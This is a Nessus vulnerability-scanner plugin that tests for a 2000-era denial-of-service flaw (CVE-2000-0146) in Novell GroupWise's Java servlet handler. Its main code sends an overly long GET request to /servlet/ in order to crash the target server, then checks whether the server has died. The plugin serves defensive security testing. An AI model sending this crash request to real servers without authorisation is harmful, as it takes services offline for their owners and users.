#
# (C) Tenable Network Security, Inc.
#

# Axel Nennker axel@nennker.de
# I got false positive from this script in revision 1.7
# Therefore I added an extra check before the attack and
# rephrased the description. 20020306


include("compat.inc");

if(description)
{
 script_id(10097);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-2000-0146");
 script_bugtraq_id(972);
 script_osvdb_id(4997);

 script_name(english:"Novell GroupWise Enhancement Pack Java Server URL Handling Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"The remote web server can be crashed by an overly long request:
	GET /servlet/AAAA...AAAA
This attack is known to affect GroupWise servers." );
 script_set_attribute(attribute:"solution", value:
"If the server is a Groupwise server, then install GroupWise Enhancement Pack 5.5 Sp1." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:C");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/02/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/02/08");
 script_cvs_date("$Date: 2012/06/28 19:20:02 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english: "Groupwise buffer overflow");
 script_category(ACT_DENIAL);
 script_copyright(english: "This script is Copyright (C) 2000-2012 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_dependencie("find_service1.nasl", "www_too_long_url.nasl");
 script_exclude_keys("www/too_long_url_crash");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

# if the server already crashes because of a too long
# url, go away

too_long = get_kb_item("www/too_long_url_crash");
if(too_long)exit(0);

port = get_http_port(default:80);
if (! get_port_state(port) || http_is_dead(port:port)) exit(0);

# now try to crash the server
r = http_send_recv3(port: port, method: 'GET', item: strcat('/servlet/', crap(400)));
if (http_is_dead(port: port, retry: 3)) security_warning(port);
